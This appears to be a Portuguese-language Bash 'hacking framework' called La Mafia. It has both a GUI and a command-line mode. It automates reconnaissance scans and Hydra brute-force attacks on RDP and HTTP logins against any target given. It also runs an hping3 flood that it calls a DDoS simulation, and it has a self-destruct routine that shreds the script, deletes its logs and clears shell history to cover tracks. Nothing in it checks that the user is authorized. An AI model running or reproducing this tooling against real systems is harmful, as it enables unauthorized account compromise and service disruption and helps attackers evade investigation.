#!/bin/bash
# 𝙻𝙰 𝙼𝙰𝙵𝙸𝙰 - ULTIMATE HACKING FRAMEWORK 🔥
# Autor: Nordy (La Mafia)

# Função de log centralizada
log_message() {
    local msg="$1"
    echo "$msg" | tee -a "$output_dir/log.txt"
}

# Função para carregar as mensagens de idioma
load_language_messages() {
    case "$LANGUAGE" in
        en) source messages_en.sh ;;
        es) source messages_es.sh ;;
        *) source messages_pt.sh ;;
    esac
}

# Função para verificar as dependências
check_dependencies() {
    echo "$MSG_CHECK_DEPENDENCIES"
    MISSING=""
    for tool in "${DEPENDENCIAS[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            MISSING+="$tool "
        fi
    done

    if [ -n "$MISSING" ]; then
        echo "$MSG_MISSING_DEPENDENCIES $MISSING"
        exit 1
    fi
}

# Função para validar se o alvo é um domínio ou IP válido
validate_target() {
    if [[ "$alvo" =~ ^[a-zA-Z0-9.-]+$ ]]; then
        if [[ "$alvo" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            if ! [[ "$alvo" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
                echo "$MSG_INVALID_IP"
                exit 1
            fi
        fi
    else
        echo "$MSG_INVALID_TARGET"
        exit 1
    fi
}

# Função para verificar permissões de root
check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "$MSG_ROOT"
        exit 1
    fi
}

# Função para escaneamento de DNS
dns_scan() {
    log_message "$MSG_DNS_SCAN $alvo"
    dig "$alvo" any | tee "$output_dir/recon/dns_scan.txt"
    dnsrecon -d "$alvo" | tee -a "$output_dir/recon/dns_recon.txt"
}

# Função para escaneamento de portas (nmap)
port_scan() {
    log_message "$MSG_PORT_SCAN $alvo"
    nmap -p- -sV "$alvo" | tee "$output_dir/recon/nmap_ports.txt"
}

# Função para buscar vulnerabilidades CVE
cve_search() {
    log_message "$MSG_CVE_SEARCH $alvo"
    searchsploit "$alvo" | tee "$output_dir/recon/cve_results.txt"
}

# Função para coletar informações WHOIS
whois_info() {
    log_message "$MSG_WHOIS_INFO $alvo"
    whois "$alvo" | tee "$output_dir/recon/whois_info.txt"
}

# Função para verificar certificados SSL/TLS
ssl_check() {
    log_message "$MSG_SSL_CHECK $alvo"
    openssl s_client -connect "$alvo":443 -showcerts | tee "$output_dir/recon/ssl_check.txt"
    testssl.sh "$alvo" | tee -a "$output_dir/recon/ssl_results.txt"
}

# Função para escaneamento web com Nikto
nikto_scan() {
    log_message "$MSG_NIKTO_SCAN $alvo"
    nikto -h "$alvo" | tee "$output_dir/recon/nikto_scan.txt"
}

# Função para realizar testes de força bruta em outros serviços (RDP, HTTP)
bruteforce_other_services() {
    log_message "$MSG_BRUTEFORCE_OTHER_SERVICES"
    hydra -L users.txt -P passwords.txt "$alvo" rdp | tee "$output_dir/bruteforce/bruteforce_rdp.txt"
    hydra -L users.txt -P passwords.txt "$alvo" http-get | tee "$output_dir/bruteforce/bruteforce_http.txt"
}

# Função para simular ataque DDoS
ddos_simulation() {
    log_message "$MSG_DDOS_SIMULATION $alvo"
    hping3 --flood -V "$alvo" || log_message "$MSG_DDOS_ERROR"
}

# Função para analisar cabeçalhos HTTP
http_headers() {
    log_message "$MSG_HTTP_HEADERS $alvo"
    curl -I "$alvo" | tee "$output_dir/http/http_headers.txt"
}

# Função para usar OpenVAS
openvas_scan() {
    log_message "$MSG_OPENVAS_SCAN $alvo"
    openvas-cli -u admin -w admin --target "$alvo" --scan-start | tee "$output_dir/openvas/openvas_scan.txt"
}

# Função para monitorar senhas vazadas (via HaveIBeenPwned API)
check_pwned_passwords() {
    log_message "$MSG_PWNED_PASSWORDS"
    curl -s "https://api.pwnedpasswords.com/range/$(echo -n "$1" | sha1sum | head -c 5)" | grep -i "$(echo -n "$1" | sha1sum | tail -c 35)" || echo "$MSG_PASSWORD_NOT_PWNED"
}

# Função para destruir dados e logs
self_destruct() {
    log_message "$MSG_SELFDESTRUCT"
    read -p "Tem certeza que deseja destruir os dados e o script? (s/n): " resposta
    if [[ "$resposta" != "s" ]]; then
        log_message "Operação cancelada."
        exit 0
    fi
    rm -rf "$output_dir"
    shred -u "$0"
    history -c
    log_message "$MSG_SELFDESTRUCT_DONE"
}

# Função para gerar relatórios automáticos
generate_report() {
    log_message "$MSG_REPORT_GENERATION"
    report="$output_dir/report_$(date +%Y%m%d_%H%M%S).txt"
    echo "Relatório gerado em: $(date)" > "$report"
    echo "Resultados do escaneamento DNS:" >> "$report"
    cat "$output_dir/recon/dns_scan.txt" >> "$report"
    echo "Resultados do escaneamento de portas:" >> "$report"
    cat "$output_dir/recon/nmap_ports.txt" >> "$report"
    log_message "$MSG_REPORT_SAVED $report"
}

# Função para a interface gráfica com zenity (GUI)
show_gui() {
    MODE=$(zenity --list --title="La Mafia - Hacking Framework" --column="Modo" "Recon" "BruteForce" "DDoS" "HTTP" "OpenVAS" "Pwned" "Relatório" "Self Destruct")
    TARGET=$(zenity --entry --title="La Mafia - Hacking Framework" --text="Digite o alvo (domínio ou IP):")

    if [ -z "$MODE" ] || [ -z "$TARGET" ]; then
        zenity --error --text="Modo ou alvo não informado. Saindo."
        exit 1
    fi

    validate_target "$TARGET"
    output_dir="logs_$TARGET"
    mkdir -p "$output_dir/recon" "$output_dir/bruteforce" "$output_dir/ddos" "$output_dir/http" "$output_dir/openvas"

    case "$MODE" in
        "Recon")
            dns_scan
            port_scan
            cve_search
            whois_info
            ssl_check
            nikto_scan
            ;;
        "BruteForce")
            bruteforce_other_services
            ;;
        "DDoS")
            ddos_simulation
            ;;
        "HTTP")
            http_headers
            ;;
        "OpenVAS")
            openvas_scan
            ;;
        "Pwned")
            PASSWORD=$(zenity --entry --title="La Mafia - Hacking Framework" --text="Digite a senha para verificar se está vazada:")
            check_pwned_passwords "$PASSWORD"
            ;;
        "Relatório")
            generate_report
            ;;
        "Self Destruct")
            self_destruct
            ;;
        *)
            zenity --error --text="Modo inválido selecionado."
            exit 1
            ;;
    esac

    zenity --info --text="Operação concluída."
}

# Verificando permissões de root
check_root

# Verificando dependências
DEPENDENCIAS=("subfinder" "amass" "nuclei" "sqlmap" "hydra" "tor" "assetfinder" "setoolkit" "dig" "dnsrecon" "nmap" "searchsploit" "whois" "openssl" "testssl.sh" "nikto" "hping3" "curl" "openvas-cli")
check_dependencies

# Se o Zenity estiver disponível, usar a interface gráfica
if command -v zenity >/dev/null 2>&1; then
    show_gui
else
    # Exibindo os modos disponíveis caso nenhum parâmetro seja passado
    if [ -z "$1" ]; then
        echo "Modos disponíveis:"
        echo "  recon       - Realiza escaneamentos (DNS, portas, CVE, etc.)"
        echo "  bruteforce  - Realiza ataque de força bruta"
        echo "  ddos        - Simula ataque DDoS"
        echo "  http        - Analisa cabeçalhos HTTP"
        echo "  openvas     - Realiza escaneamento com OpenVAS"
        echo "  pwned       - Verifica se a senha está vazada"
        echo "  report      - Gera relatório de todos os escaneamentos"
        echo "  selfdestruct - Destrói dados e o script"
        exit 0
    fi

    modo=$1
    alvo=$2

    # Validação do alvo (domínio ou IP)
    validate_target

    # Criar diretório de saída para logs
    output_dir="logs_$alvo"
    mkdir -p "$output_dir/recon" "$output_dir/bruteforce" "$output_dir/ddos" "$output_dir/http" "$output_dir/openvas"

    # Estruturação do fluxo de execução com as novas funções
    case "$modo" in
        recon)
            dns_scan
            port_scan
            cve_search
            whois_info
            ssl_check
            nikto_scan
            ;;

        bruteforce)
            bruteforce_other_services
            ;;

        ddos)
            ddos_simulation
            ;;

        http)
            http_headers
            ;;

        openvas)
            openvas_scan
            ;;

        pwned)
            check_pwned_passwords "$3"
            ;;

        report)
            generate_report
            ;;

        selfdestruct)
            self_destruct
            ;;

        *)
            echo "Modo inválido."
            exit 1
            ;;
    esac
fi
